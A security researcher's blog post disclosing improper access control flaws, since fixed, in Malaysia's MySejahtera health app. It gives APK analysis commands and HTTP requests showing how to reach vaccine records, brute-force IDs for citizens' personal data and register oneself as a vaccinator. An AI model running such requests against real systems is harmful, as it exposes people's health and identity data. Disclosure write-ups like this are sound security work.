---
layout: post
title:  "Breaking MySejahtera Application - A Story of Improper Access Control Vulnerability"
date:   2022-09-20 23:00:00 +0800
tags:
    - mysejahtera
    - broken access control
---

Overview
--------
MySejahtera Application (hereinafter referred to as "App") is an application which was originally developed to assist the Government in managing the COVID-19 outbreak in Malaysia by among others, allowing the App users to perform a self-health assessment, monitor health status and share the information with the Ministry of Health (MOH) so necessary actions could be implemented. 

The App is owned and operated by the Government of Malaysia. As the country transits from pandemic phase into endemic phase, MySejahtera is evolving from a tool designed specifically to combat COVID-19 pandemic to a public health application. As such, we have improvised our terms and conditions and privacy policies of MySejahtera to fit this purpose. 

MySejahtera is owned and operated by the Government of Malaysia. It is administrated by the Ministry of Health (MOH) and assisted by the National Security Council (NSC) and the Malaysian Administrative Modernisation and Management Planning Unit (MAMPU). The Government assures that personal information will only be used for the purpose of managing and mitigating COVID-19 outbreak. It will not be shared to any other party.

Vulnerability Description
-------------------------
MySejahtera is prone to improper access control where attackers could impersonate logged on users (e.g. hospitals or clinics) to access vaccine and doctor records. Further analysis of the issue, we found the vulnerability is related to web cache where the session is not really expired and allows non-staff users to impersonate existing logged on users to login as staff and access to restricted web pages. We believe the web pages should not be visited by the non-staff users as they contain sensitive information.

An access control is a security process that controls usage of specific resources within a predefined criteria and is a part of the AAA (Authentication, Authorization, Accounting) security model. All modern systems use certain access control models to manage their security. Access control models can be grouped in three main classes: Mandatory Access Control (MAC), Discretionary Access Control (DAC), and Role Based Access Control (RBAC). When any mechanism is not applied or otherwise fails, attackers can compromise the security of the application by gaining privileges and reading sensitive information. There are two distinct behaviours that can introduce access control weaknesses:
    - Specification
        - An incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.
    - Enforcement
        - The mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.

Vulnerability Impact
--------------------
This weakness allows an attacker with least privileges to bypass intended security restrictions and perform a variety of actions depending on the source of error and functionality of the application. An attacker might be able to perform certain actions by gaining elevated privileges, reading otherwise restricted information, executing commands, bypassing implemented security mechanisms, etc. 

In this case, MySejahtera application allows any users to access to vaccine and hospital/clinic user records as well as updating vaccine booster. 


Technical Analysis
------------------
Before we deep dive into the vulnerability, the analysis based on low privilege user and this to demonstrate the access capability on the MySejahtera sensitive information web pages. There are three (3) different web path that allows users to access to the restricted web pages. In a web page, it is mandatory to restrict web pages that contain sensitive information for non-Admin user level. These pages supposed to be protected by Triple-A (Authentication, Authorization, Accounting) access control criteria. Our analysis heavily focused on APK file of MySejahtera (APK stands for Android Package) and MySejahtera web portal, and we pulled this APK from PlayStore (version tested until before this writeup, couldn't remember which version LOL). APK is an archive file, which contains multiple files along with metadata. The archive works similarly to ZIP and RAR, and we can just extract with any ZIP tool. 

In our earlier stage of analysis, we used Reverse Engineering technique (Static Analysis) and once we extracted the APK file and analyze file by file that contains inside. After analyzing dozens of files found inside the APK, we found 867 files contain inside the APK which LOL for us to analyze everything. 
```
PS C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera> (Get-ChildItem -File -Recurse| Measure-Object).Count
867
```

We split the file count types inside the APK and here's the result:
```
PS C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera> Get-ChildItem -Recurse -File | group Extension -NoElement  | sort Count -Descending

Count Name
----- ----
  226 .xml
  208 .js
  137 .svg
  101 .html
   80 .png
   35 .version
   19 .properties
   10 .json
    7 .otf
    7 .gif
    6 .ttf
    6 .jpeg
    6 .jpg
    4 .cer
    2 .css
    1 .dex
    1 .SF
    1 .kotlin_module
    1 .ogg
    1 .MF
    1 .RSA
    1 .woff
    1 .ttc
    1 .txt
    1 .woff2
    1 .arsc
    1
    1 .ico
```

We performed further enumeration on the extracted files (to speed up our analysis) to identify interesting information such as "API". Why API? Because mobile app uses a lot of APIs at the backend when interact between client and server. Here's one of the interesting path we found when we search for specific value:
```
PS C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera> Get-ChildItem -r | ? {$_.psiscontainer -eq $false} | ? {gc $_.pspath |select-string -pattern "api"}

    Directory: C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera\assets\www\build


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
------          1/1/1981   1:01 AM         133832 0.js
------          1/1/1981   1:01 AM         127187 1.js
------          1/1/1981   1:01 AM         230844 10.js
------          1/1/1981   1:01 AM         718582 103.js
------          1/1/1981   1:01 AM          58216 17.js
------          1/1/1981   1:01 AM         129928 2.js
------          1/1/1981   1:01 AM          55867 3.js
------          1/1/1981   1:01 AM          60073 36.js
------          1/1/1981   1:01 AM         258321 5.js
------          1/1/1981   1:01 AM          25991 63.js
------          1/1/1981   1:01 AM          14972 64.js
------          1/1/1981   1:01 AM         112381 7.js
------          1/1/1981   1:01 AM         234688 8.js
------          1/1/1981   1:01 AM          15317 81.js
------          1/1/1981   1:01 AM          15931 82.js
------          1/1/1981   1:01 AM          10167 84.js
------          1/1/1981   1:01 AM          52294 87.js
------          1/1/1981   1:01 AM         237105 9.js
------          1/1/1981   1:01 AM          44693 97.js
------          1/1/1981   1:01 AM         253259 99.js
------          1/1/1981   1:01 AM        1971808 main.css
------          1/1/1981   1:01 AM        1166811 main.js
------          1/1/1981   1:01 AM          97180 polyfills.js
------          1/1/1981   1:01 AM        3242027 vendor.js
```

We proceed looking for another interesting keyword such "logout" and turns out the strings are available on a few JavaScript files. One of the reason we're looking into this strings is, if you navigate to your MySj app on your phone, you should be able to find a button logout there and this button contains an hyperlink to the logout API. In reverse engineering, searching for a strings is one of the quickest technique when analyzing a file / binary unless it is strip or obfuscated then its a different story. So yeah, here's the result. 
```
PS C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera> Get-ChildItem -r | ? {$_.psiscontainer -eq $false} | ? {gc $_.pspath |select-string -pattern "logout"}


    Directory: C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera\assets\www\build


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
------          1/1/1981   1:01 AM          13342 43.js
------          1/1/1981   1:01 AM          42948 45.js
------          1/1/1981   1:01 AM          96523 6.js
------          1/1/1981   1:01 AM          24400 74.js
------          1/1/1981   1:01 AM          10023 76.js
------          1/1/1981   1:01 AM        1166811 main.js
```

We interested in the file **main.js** as it shows a huge size (if you look into the Length). When open the JS file in our note editor, we found the first string named "webpackJsonp". Analyzing the main JS itself is quite messy as you can see in the file itself contains 30000+ lines of JavaScript. As usual, we just grep those interesting values to speed up our analysis. 
```
PS C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera> Get-ChildItem -r | ? {$_.psiscontainer -eq $false} | ? {gc $_.pspath |select-string -pattern "epms"}


    Directory: C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera\assets\www\assets\img


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
------          1/1/1981   1:01 AM         519262 health_ministry.svg


    Directory: C:\Users\nafiez\Downloads\my.gov.onegovappstore.mysejahtera\assets\www\build


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
------          1/1/1981   1:01 AM          46902 4.js
------          1/1/1981   1:01 AM          25991 63.js
------          1/1/1981   1:01 AM        1166811 main.js
```

So why **epms**? The path **epms** found to have a relation to APIs. How do we know it uses APIs at the backend? We can grep the value **epms** in the main JS file and we should be able to see a path to "/epms/v1/mobileApp/profile/image/". So "v1" usually is used in APIs kind of web services.
```
                e.prototype.getImagePath = function() {
					if (this.designationCode) return this.idFound = !0, a.a.devLink + "/epms/v1/mobileApp/profile/image/" + this.designationCode + ".png";
					this.idFound = !1
				}
```

One way to identify the availability of it is to brute force the directory. After trial and error, I manage to found the path for the web services and it turns out MySejahtera uses Swagger in the backend. Here's the screenshot of the Swagger available on the MySj web path. The Swagger OAUTH2 to authenticate to the portal and it seems only Admin and those has restricted access can use this APIs. So if you have access to it, you should have access to entire functions of the MySj. 
![Screenshot](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/swagger_mysj.png "Screenshot")

I dig further analysis on the Swagger itself and it turns out there are some web path are not associate with the APIs. It seems a direct call perform directly from the MySejahtera website. So what I mention here, if you browse / have access to the portal itself, you won't be able to use it on the mobile app. I assume that is why we see the worker at vaccination centre uses laptop to key in our name, etc. (when they asked for our identification card). Next analysis I focused on the MySejahtera portal itself. It allows any users to login to the portal and from the portal we (normal users) are allow to create QR location, etc. and only has minimal functionality. 

I continue diving in the main portal and analyzed the HTML and JavaScript content. Here's where I found the initial culprit of the issue.

Vulnerability #1 - Manage Vaccine Records
-----------------------------------------
At the early stage of the analysis, I found a few interesting JS code embedded in MySejahtera web portal. One of it was the "/checkin/manageBranches". The code below shows the function of the view records implemented for different tenant types. In this case we look further at the tenant HEALTH_FACILITY and the path is "/manageVaccineeRecords/locationId". 
```
        function viewRecords(locationId, visitor, locationName) {
            if(tenantType == 'GOVERNMENT_BODY') {
                window.location.href = _ctx + "/viewRecords/locationId/" + locationId + "/visitor/" + visitor + "?ln=" + locationName;
            } else if(tenantType == 'EVENT_BODY') {
                window.location.href = _ctx + "/viewEventRecords/locationId/" + locationId + "?ln=" + locationName;
            } else if(tenantType == 'TRAVELLER') {
                window.location.href = _ctx + "/viewTravelRecords/locationId/" + locationId + "?ln=" + locationName;
            } else if(tenantType == 'TRAVEL_QUARANTINE') {
                window.location.href = _ctx + "/viewTravelQuarantineRecords/locationId/" + locationId + "?ln=" + locationName;
            } else if(tenantType == 'HEALTH_FACILITY') {
                window.location.href = _ctx + "/manageVaccineeRecords/locationId/" + locationId + "?ln=" + encodeURIComponent(locationName);
            }
        }
```

The **viewRecords** function in the JS explain the tenant type (authorized) based on the access level. The "HEALTH_FACILITY" tenant only accessible by the authorized doctors / clinics / hospital. I was trying some crazy stuff like brute forcing the **locationId** however it didn't work as we need to know exactly how it gets generated and what kind of strings there we don't really know. It seems the **locationId** gets generated on the backend of the server. So to understand how we can generate the **locationId** strings, we can simply create a QR code location (the one that we keep scanning when entering premises using MySj mobile app) and we should be able to generate the location ID strings. The strings itself contains 32-bit length (it looks like MD5 lol but I don't think so). So when creating the QR code location, we can specify the name of the premise such hospitals or clinics name. In this case we can simply use well known hospital / clinics name in Malaysia and we can get the location ID. Easy right? Or we can just blindly generate MD5sum in Linux and generates thousands or millions of it and use against it (I tried this and it works LOL). Next is to find the hospital name based on "?ln=" parameter. It's easy, just put the hospital name and you are good to go. You can see the example visualizing the locations, etc. and how the final URL should looks like.
```
https://mysejahtera.malaysia.gov.my/checkin - URL with path after login

/manageVaccineeRecords/locationId/<random 32 bit> - path to manage vaccine record with 32-bit random strings 

?ln=Hospital%20Here - ln is location name and we can put any hospital name here
 

Final URL should be like this:
https://mysejahtera.malaysia.gov.my/checkin/manageVaccineeRecords/locationId/5ee309c289892068a4d3f0bb?ln=HospitalNameHere
```

Let's take a look at the example
```
GET /checkin/manageVaccineeRecords/locationId/5ee309c289892068a4d3f0bb?ln=Hospital%20Putrajaya HTTP/2
Host: mysejahtera.malaysia.gov.my
Cookie: acw_tc=<redacted_here>
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Voila! We got access to the hospital record :)
![Screenshot](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/hospital_record.png "Screenshot")

Vulnerability #2 - Vaccine Details
----------------------------------
Second vulnerability was found in "/vaccineeDetailView/locationId/" where there is no restrictions on accessing the vaccine details of a person(s). I would say I can retrieve all the data belongs to Malaysians :). One of the main problem here was the developer did not include any restrictions / access levels in the page that allows non-staff to access the sensitive information. The issue is related to the first vulnerability. Vaccines ID is quite tricky because we don't know the exact value of it. So in this case, I just brute force the value (32 bit strings, similar to location ID) and able to retrieve the working ID :)

Here's the example request to the server:
```
GET /checkin/v1/rest/api/vaccine/vaccineeDetails/<redacted here> HTTP/2
Host: mysejahtera.malaysia.gov.my
Cookie: acw_tc=<redacted here>
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
X-Auth-Token: <redacted here>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://mysejahtera.malaysia.gov.my/checkin/vaccineeDetailView/locationId/<readacted>/ln/<redacted>/vaccineeId/<redacted>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Hey yo mates, here's your vaccine details along with all the other sensitive information such as your full name, identification number, contact number, ethnics, industry you work for, health details (if you have allergy, etc. LOL), types of vaccines, doctors that authorized the vaccine types, 1st and 2nd details of vaccines, facility you get vaccines (e.g. hospitals / clinics), etc. 
![Screenshot 1](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/vaccine_details.png "Screenshot 1")
![Screenshot 2](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/vaccine_details2.png "Screenshot 2")

Worst scenario here is we can add our own vaccine booster as much as we can (I guess).
![Screenshot](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/add_booster.png "Screenshot")

Vulnerability #3 - Manage Doctor Records
----------------------------------------
Third vulnerability was found in "/manageDoctorRecords/locationId/" which allows non-staff users to add themselves as vaccinator. The application does not check if the vaccinators are real staff and you can become a doctor :) Here's the JS code reference to the manage doctor record:
```
        function manageDoctorRecords(locationId, locationName) {
            window.location.href = _ctx + "/manageDoctorRecords/locationId/" + locationId + "?ln=" + locationName;
        }
```

Once we get the vaccinator list, we can add ourselves as the vaccinator. MMC number can be retrieved from https://meritsmmc.moh.gov.my by picking up a random number from the list. Similar to the first issue, we just need to known location ID and we can simply send the following request:
```
GET /checkin/manageDoctorRecords/locationId/<readacted>?ln=<redacted> HTTP/2
Host: mysejahtera.malaysia.gov.my
Cookie: acw_tc=<redacted>
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://mysejahtera.malaysia.gov.my/checkin/hfAccountSettings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Adding ourselves as doctor:
```
POST /checkin/v1/rest/api/vaccine/saveDoctorData/<redacted> HTTP/2
Host: mysejahtera.malaysia.gov.my
Cookie: acw_tc=<redacted>
Content-Length: 53
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
X-Auth-Token: <redacted>
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://mysejahtera.malaysia.gov.my
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://mysejahtera.malaysia.gov.my/checkin/manageDoctorRecords/locationId/61761ead66a9d57d0bb8f93f?ln=food
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"name":"tester1","identityNumber":"36702","id":null}
```

So yeah, we can be a doctor and add ourselves as vaccinator. 
![Screenshot](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/add_as_doctor.png "Screenshot")

Conclusion
----------
Improper access control weaknesses usually result in logic errors. Access control are not typically amenable to automated static or dynamic testing. Developers are mandatory to execute manual testing to detect missing piece of access control. Developers must carefully manage settings and handling of privileges as well as pay attention to security zones within the application. This should have enforce record ownership, rather than accepting users can create, read, update and delete any record. Devs should also integrate mechanisms that control privilege separation functionality and think about creating architecture that relies on the least privilege principle.

Vulnerability Disclosure
------------------------
The security issues was found earlier this year. I contacted NACSA / NC4 since they're the team that responsible on the security. After back and forth with them, I was told the security related is fully handled by Ministry of Health (MoH) and I was given a contact to approach them. I wrote an email to MoH contact person in August 2022 and having a discussion with KPISoft (team that handle the development, 3rd party) and the team that in charge with security related to MySejahtera from MoH. During the discussion I was told that KPISoft has improve more stuff (features, security, move to new platform, etc.) and they want me to demonstrate the impact on the latest platform they used. I did a quick demo during the meeting and able to demonstrate the exploits that impacts their new update features. The dev team acknowledge the issues and asked for the report that I have written. Report provided after the meeting and tooks them a week to fix the vulnerability. I then again retest the issue (as per request) and confirm the vulnerability has been remediate. 

Huge thanks to MoH and KPISoft for taking this issue serious and deliver the fix as fast as they can :) Thanks to Dr Mahesh from MoH for the green light for me to write this blog post.

References
----------
https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/
https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
